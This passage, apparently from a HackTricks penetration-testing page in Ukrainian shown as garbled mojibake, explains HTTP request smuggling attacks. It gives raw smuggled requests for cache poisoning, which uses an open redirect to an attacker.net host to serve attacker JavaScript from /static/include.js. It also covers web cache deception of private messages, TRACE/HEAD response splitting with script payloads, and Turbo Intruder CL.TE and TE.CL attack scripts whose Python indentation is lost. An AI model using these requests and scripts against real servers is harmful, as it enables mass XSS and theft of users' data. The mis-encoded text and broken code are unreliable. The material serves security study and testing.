–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ —Å—Ç–∞—î –æ—Å–æ–±–ª–∏–≤–æ –ø–æ—Ç—É–∂–Ω–æ—é, —è–∫—â–æ –≤–∏—è–≤–ª–µ–Ω–æ **–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –Ω–∞ –í—ñ–¥–∫—Ä–∏—Ç–∏–π –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è** –∞–±–æ —è–∫—â–æ —î **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–∞ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–∞ —Å–∞–π—Ç—ñ**. –¢–∞–∫—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –∑–∞–º—ñ–Ω–∏ –∫–µ—à–æ–≤–∞–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É `/static/include.js` –Ω–∞ —Å–∫—Ä–∏–ø—Ç –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, —â–æ —Ñ–∞–∫—Ç–∏—á–Ω–æ –¥–æ–∑–≤–æ–ª—è—î —à–∏—Ä–æ–∫–æ–º–∞—Å—à—Ç–∞–±–Ω—É –∞—Ç–∞–∫—É –ú—ñ–∂—Å–∞–π—Ç–æ–≤–æ–≥–æ –°–∫—Ä–∏–ø—Ç—ñ–Ω–≥—É (XSS) –ø—Ä–æ—Ç–∏ –≤—Å—ñ—Ö –∫–ª—ñ—î–Ω—Ç—ñ–≤, —è–∫—ñ –∑–∞–ø–∏—Ç—É—é—Ç—å –æ–Ω–æ–≤–ª–µ–Ω–∏–π `/static/include.js`.

–ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ —ñ–ª—é—Å—Ç—Ä–∞—Ü—ñ—é –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **–æ—Ç—Ä—É—î–Ω–Ω—è –∫–µ—à—É –≤ –ø–æ—î–¥–Ω–∞–Ω–Ω—ñ –∑ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è–º –Ω–∞ –≤—ñ–¥–∫—Ä–∏—Ç–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–∞ —Å–∞–π—Ç—ñ**. –ú–µ—Ç–∞ –ø–æ–ª—è–≥–∞—î –≤ –∑–º—ñ–Ω—ñ –∫–µ—à–æ–≤–∞–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É `/static/include.js` –¥–ª—è –Ω–∞–¥–∞–Ω–Ω—è JavaScript-–∫–æ–¥—É, –∫–µ—Ä–æ–≤–∞–Ω–æ–≥–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ –≤–±—É–¥–æ–≤–∞–Ω–∏–π –∑–∞–ø–∏—Ç, —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–π –Ω–∞ `/post/next?postId=3`. –¶–µ–π –∑–∞–ø–∏—Ç –±—É–¥–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–π –Ω–∞ `/post?postId=4`, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∑–Ω–∞—á–µ–Ω–Ω—è **–∑–∞–≥–æ–ª–æ–≤–∫–∞ Host**, —â–æ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –¥–æ–º–µ–Ω. –ó–º—ñ–Ω–∏–≤—à–∏ **–∑–∞–≥–æ–ª–æ–≤–æ–∫ Host**, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ –∑–∞–ø–∏—Ç –Ω–∞ —Å–≤—ñ–π –¥–æ–º–µ–Ω (**–≤–Ω—É—Ç—Ä—ñ—à–Ω—î –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–∞ –≤—ñ–¥–∫—Ä–∏—Ç–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è**).

–ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ–≥–æ **–∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è —Å–æ–∫–µ—Ç—ñ–≤**, —Å–ª—ñ–¥ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ **GET-–∑–∞–ø–∏—Ç** –¥–ª—è `/static/include.js`. –¶–µ–π –∑–∞–ø–∏—Ç –±—É–¥–µ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–∏–π –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º –∑–∞–ø–∏—Ç–æ–º **–≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ–≥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–∞ –≤—ñ–¥–∫—Ä–∏—Ç–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è** —ñ –æ—Ç—Ä–∏–º–∞—î –≤–º—ñ—Å—Ç —Å–∫—Ä–∏–ø—Ç–∞, –∫–æ—Ç—Ä–∏–º –∫–µ—Ä—É—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫.

–ü–æ–¥–∞–ª—å—à—ñ –∑–∞–ø–∏—Ç–∏ –¥–ª—è `/static/include.js` –±—É–¥—É—Ç—å –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞—Ç–∏ –∫–µ—à–æ–≤–∞–Ω–∏–π –≤–º—ñ—Å—Ç —Å–∫—Ä–∏–ø—Ç–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –∑–∞–ø—É—Å–∫–∞—é—á–∏ —à–∏—Ä–æ–∫–∏–π XSS-–∞—Ç–∞–∫—É.

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è HTTP-–∑–∞–ø–∏—Ç—ñ–≤-–ø–µ—Ä–µ–º–∏–∫–∞–Ω—å –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –æ–±–º–∞–Ω—É –≤–µ–±-–∫–µ—à—É <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **–Ø–∫–∞ —Ä—ñ–∑–Ω–∏—Ü—è –º—ñ–∂ –æ—Ç—Ä—É—î–Ω–Ω—è–º –≤–µ–±-–∫–µ—à—É —Ç–∞ –æ–±–º–∞–Ω–æ–º –≤–µ–±-–∫–µ—à—É?**
>
> * –£ –≤–∏–ø–∞–¥–∫—É **–æ—Ç—Ä—É—î–Ω–Ω—è –≤–µ–±-–∫–µ—à—É**, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º—É—à—É—î –¥–æ–¥–∞—Ç–æ–∫ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –¥–µ—è–∫–∏–π —à–∫—ñ–¥–ª–∏–≤–∏–π –≤–º—ñ—Å—Ç —É –∫–µ—à—ñ, —ñ —Ü–µ–π –≤–º—ñ—Å—Ç –æ–±—Å–ª—É–≥–æ–≤—É—î—Ç—å—Å—è –∑ –∫–µ—à—É —ñ–Ω—à–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –¥–æ–¥–∞—Ç–∫—É.
> * –£ –≤–∏–ø–∞–¥–∫—É **–æ–±–º–∞–Ω—É –≤–µ–±-–∫–µ—à—É**, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º—É—à—É—î –¥–æ–¥–∞—Ç–æ–∫ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –¥–µ—è–∫–∏–π —á—É—Ç–ª–∏–≤–∏–π –≤–º—ñ—Å—Ç, —â–æ –Ω–∞–ª–µ–∂–∏—Ç—å —ñ–Ω—à–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ, —É –∫–µ—à—ñ, –∞ –ø–æ—Ç—ñ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –æ—Ç—Ä–∏–º—É—î —Ü–µ–π –≤–º—ñ—Å—Ç –∑ –∫–µ—à—É.

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ —Å—Ç–≤–æ—Ä—é—î –ø—ñ–¥—Å—Ç–∞–≤–Ω–∏–π –∑–∞–ø–∏—Ç, —è–∫–∏–π –æ—Ç—Ä–∏–º—É—î —á—É—Ç–ª–∏–≤–∏–π –≤–º—ñ—Å—Ç, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏–π –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –†–æ–∑–≥–ª—è–Ω—å—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
–Ø–∫—â–æ —Ü–µ–π –∫–æ–Ω—Ç—Ä–∞–±–∞–Ω–¥–Ω–∏–π –∑–∞–ø–∏—Ç –∑–∞–±—Ä—É–¥–Ω—é—î –∑–∞–ø–∏—Å –∫–µ—à—É, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è —Å—Ç–∞—Ç–∏—á–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `/someimage.png`), —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ –∂–µ—Ä—Ç–≤–∏ –∑ `/private/messages` –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–∞–∫–µ—à–æ–≤–∞–Ω—ñ –ø—ñ–¥ –∑–∞–ø–∏—Å —Å—Ç–∞—Ç–∏—á–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –º–æ–∂–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü—ñ –∑–∞–∫–µ—à–æ–≤–∞–Ω—ñ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è–º TRACE —á–µ—Ä–µ–∑ HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**–£ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://portswigger.net/research/trace-desync-attack) –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–æ, —â–æ —è–∫—â–æ —Å–µ—Ä–≤–µ—Ä –º–∞—î —É–≤—ñ–º–∫–Ω–µ–Ω–∏–π –º–µ—Ç–æ–¥ TRACE, –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –∑ HTTP Request Smuggling. –¶–µ —Ç–æ–º—É, —â–æ —Ü–µ–π –º–µ—Ç–æ–¥ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏–º–µ –±—É–¥—å-—è–∫–∏–π –∑–∞–≥–æ–ª–æ–≤–æ–∫, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∏–π –Ω–∞ —Å–µ—Ä–≤–µ—Ä, —è–∫ —á–∞—Å—Ç–∏–Ω—É —Ç—ñ–ª–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
–ë—É–¥–µ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å —É –≤–∏–≥–ª—è–¥—ñ:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
–ü—Ä–∏–∫–ª–∞–¥–æ–º –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü—ñ—î—é –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é –º–æ–∂–µ –±—É—Ç–∏ **–ø–µ—Ä—à –∑–∞ –≤—Å–µ –ø–µ—Ä–µ–¥–∞—á–∞ –∑–∞–ø–∏—Ç—É HEAD**. –ù–∞ —Ü–µ–π –∑–∞–ø–∏—Ç –±—É–¥–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ –ª–∏—à–µ **–∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ –∑–∞–ø–∏—Ç—É GET** (**`Content-Type`** —Å–µ—Ä–µ–¥ –Ω–∏—Ö). –Ü –≤—ñ–¥—Ä–∞–∑—É –ø—ñ—Å–ª—è HEAD –ø–µ—Ä–µ–¥–∞–π—Ç–µ –∑–∞–ø–∏—Ç TRACE, —è–∫–∏–π –±—É–¥–µ **–≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏ –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ –¥–∞–Ω—ñ**.\
–û—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å HEAD –±—É–¥–µ –º—ñ—Å—Ç–∏—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Content-Length`, **–≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –∑–∞–ø–∏—Ç TRACE –±—É–¥–µ —Ä–æ–∑–≥–ª—è–¥–∞—Ç–∏—Å—è —è–∫ —Ç—ñ–ª–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ HEAD, —Ç–∏–º —Å–∞–º–∏–º –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—á–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –¥–∞–Ω—ñ** —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. \
–¶—è –≤—ñ–¥–ø–æ–≤—ñ–¥—å –±—É–¥–µ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∞ –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É —á–µ—Ä–µ–∑ –∑'—î–¥–Ω–∞–Ω–Ω—è, —Ç–æ–º—É —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ **–≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –≤ –∫–µ—à–æ–≤–∞–Ω–æ–º—É —Ñ–∞–π–ª—ñ JS, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –¥–ª—è –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ JS-–∫–æ–¥—É**.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è TRACE —á–µ—Ä–µ–∑ —Ä–æ–∑—â–µ–ø–ª–µ–Ω–Ω—è HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥—ñ <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

–ü—Ä–æ–¥–æ–≤–∂—É–π—Ç–µ —Å–ª—ñ–¥—É–≤–∞—Ç–∏ [**—Ü—å–æ–º—É –ø–æ—Å—Ç—É**](https://portswigger.net/research/trace-desync-attack), –¥–µ –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–æ —â–µ –æ–¥–∏–Ω —Å–ø–æ—Å—ñ–± –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –º–µ—Ç–æ–¥–æ–º TRACE. –Ø–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ, –ø–µ—Ä–µ–¥–∞—á–∞ –∑–∞–ø–∏—Ç—É HEAD —ñ –∑–∞–ø–∏—Ç—É TRACE –¥–æ–∑–≤–æ–ª—è—î **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –¥–µ—è–∫—ñ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω—ñ –¥–∞–Ω—ñ** —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ –∑–∞–ø–∏—Ç HEAD. –î–æ–≤–∂–∏–Ω–∞ —Ç—ñ–ª–∞ –∑–∞–ø–∏—Ç—É HEAD —Ñ–∞–∫—Ç–∏—á–Ω–æ –≤–∫–∞–∑—É—î—Ç—å—Å—è –≤ –∑–∞–≥–æ–ª–æ–≤–∫—É Content-Length —ñ —Ñ–æ—Ä–º—É—î—Ç—å—Å—è –≤—ñ–¥–ø–æ–≤—ñ–¥–¥—é –Ω–∞ –∑–∞–ø–∏—Ç TRACE.

–û—Ç–∂–µ, –Ω–æ–≤–∞ —ñ–¥–µ—è –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ, –∑–Ω–∞—é—á–∏ —Ü–µ–π Content-Length —Ç–∞ –¥–∞–Ω—ñ, —â–æ –Ω–∞–¥—ñ–π—à–ª–∏ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ TRACE, –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ —Ç–∞–∫, —â–æ–± –≤—ñ–¥–ø–æ–≤—ñ–¥—å TRACE –º—ñ—Å—Ç–∏–ª–∞ –¥—ñ–π—Å–Ω—É HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥—å –ø—ñ—Å–ª—è –æ—Å—Ç–∞–Ω–Ω—å–æ–≥–æ –±–∞–π—Ç—É Content-Length, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –ø–æ–≤–Ω—ñ—Å—Ç—é –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –∑–∞–ø–∏—Ç –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ (—â–æ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –æ—Ç—Ä—É—î–Ω–Ω—è –∫–µ—à—É).

–ü—Ä–∏–∫–ª–∞–¥:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
–ó–≥–µ–Ω–µ—Ä—É—î —Ü—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å HEAD –º–∞—î Content-Length, —â–æ —Ä–æ–±–∏—Ç—å –≤—ñ–¥–ø–æ–≤—ñ–¥—å TRACE —á–∞—Å—Ç–∏–Ω–æ—é —Ç—ñ–ª–∞ HEAD, —ñ —è–∫ —Ç—ñ–ª—å–∫–∏ –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è Content-Length HEAD, –¥—ñ–π—Å–Ω–∞ HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥—å –≤–±—É–¥–æ–≤—É—î—Ç—å—Å—è):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(‚Äúarbitrary response‚Äù)</script>
```
### –ó–±—Ä–æ–π–æ–≤–∏–π HTTP Request Smuggling –∑ HTTP Response Desynchronisation

–ß–∏ –≤–∏ –∑–Ω–∞–π—à–ª–∏ –¥–µ—è–∫—É –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å HTTP Request Smuggling —ñ –Ω–µ –∑–Ω–∞—î—Ç–µ, —è–∫ —ó—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏. –°–ø—Ä–æ–±—É–π—Ç–µ —Ü–µ–π —ñ–Ω—à–∏–π –º–µ—Ç–æ–¥ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### –Ü–Ω—à—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ HTTP Request Smuggling

* HTTP Request Smuggling –≤ –±—Ä–∞—É–∑–µ—Ä—ñ (–∑ –±–æ–∫—É –∫–ª—ñ—î–Ω—Ç–∞)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request Smuggling –≤ HTTP/2 Downgrades

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## –°—Ü–µ–Ω–∞—Ä—ñ—ó Turbo Intruder

### CL.TE

–ó [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

–ó: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): –¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç —î –≥—Ä–∞–º–∞—Ç–∏—á–Ω–∏–º HTTP Fuzzer, –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –¥–∏–≤–Ω–∏—Ö —Ä—ñ–∑–Ω–∏—Ü—å —É –∑–∞–ø–∏—Ç–∞—Ö.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks swag**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFTs**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
